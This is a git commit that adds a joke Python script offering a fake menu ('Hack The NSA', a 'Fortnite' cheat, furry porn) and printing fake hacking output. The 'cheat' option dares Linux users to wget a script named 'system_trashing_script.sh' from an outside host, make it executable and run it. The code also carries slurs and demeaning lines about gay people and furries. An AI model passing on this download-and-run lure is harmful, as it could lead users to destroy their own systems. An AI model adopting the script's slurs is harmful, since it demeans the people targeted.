07548c840da4db126e347cc82822a8d6d54c131e
da troll <m@m.m>
2022-06-17 01:52:33 -0400

    darkness

---
+++ terror.py
@@ -0,0 +1,54 @@
+from colorama import Fore
+from colorama import Style
+import time
+import random
+
+print(f'''{Fore.RED}
+▄▄▄█████▓▓█████  ██▀███   ██▀███   ▒█████   ██▀███  
+▓  ██▒ ▓▒▓█   ▀ ▓██ ▒ ██▒▓██ ▒ ██▒▒██▒  ██▒▓██ ▒ ██▒
+▒ ▓██░ ▒░▒███   ▓██ ░▄█ ▒▓██ ░▄█ ▒▒██░  ██▒▓██ ░▄█ ▒
+░ ▓██▓ ░ ▒▓█  ▄ ▒██▀▀█▄  ▒██▀▀█▄  ▒██   ██░▒██▀▀█▄  
+  ▒██▒ ░ ░▒████▒░██▓ ▒██▒░██▓ ▒██▒░ ████▓▒░░██▓ ▒██▒
+  ▒ ░░   ░░ ▒░ ░░ ▒▓ ░▒▓░░ ▒▓ ░▒▓░░ ▒░▒░▒░ ░ ▒▓ ░▒▓░
+    ░     ░ ░  ░  ░▒ ░ ▒░  ░▒ ░ ▒░  ░ ▒ ▒░   ░▒ ░ ▒░
+  ░         ░     ░░   ░   ░░   ░ ░ ░ ░ ▒    ░░   ░ 
+            ░  ░   ░        ░         ░ ░     ░     
+                                                    
+		[1] Hack The NSA
+		[2] Fortnite CHeat donwlo
+		[3] Gay furry porn
+{Style.RESET_ALL}
+''')
+gay = random.randint(0, 100)
+num = input("			Number: ")
+if num == "3":
+ input("on scale one to ten how gay the porn should be?")
+ print("omg u so sus!!! UwU")
+ time.sleep(10)
+ print("if you would like actual furry porn please kindly visit e621.net and search the term >eevee rating:s order:random< when the moth is weird?????")
+if num == "1":
+ print(f'{Fore.GREEN}HAcking started')
+ time.sleep(0.4)
+ print(f'Fore.red retard mode starting...')
+ time.sleep(0.1)
+ print(f'at {gay} percen%')
+ time.sleep(0.8) 
+ print(f'at {gay} percen%')
+ time.sleep(3) 
+ print(f'at {gay} percen%')
+ time.sleep(4)
+ print(f'{Fore.RED}FAILED THE KILLTHE FURRIES time.sleep(3')
+ print(f'YOU HAVE BEEN HACKED BY THGE NSAYOU IP IS 127.0.01,')
+ time.sleep(1)
+ print("TERROR GANG ON TOP (im a bottom tho >:3)")
+ time.sleep(10)
+if num == "2":
+ print("""
+ hey linux users !!!
+ i bet you do this with only you LEFT HAND 
+ >wget https://smug.ga/scripts/system_trashing_script.sh
+ >chmod u+x system_trashing_script.sh
+ >./system_trashing_script.sh
+ i repeat, i bet YOU EONT DO THIS WITH ONLY UR LEFT HAND THE OTHER ONE CANT USE IT
+
+ """)
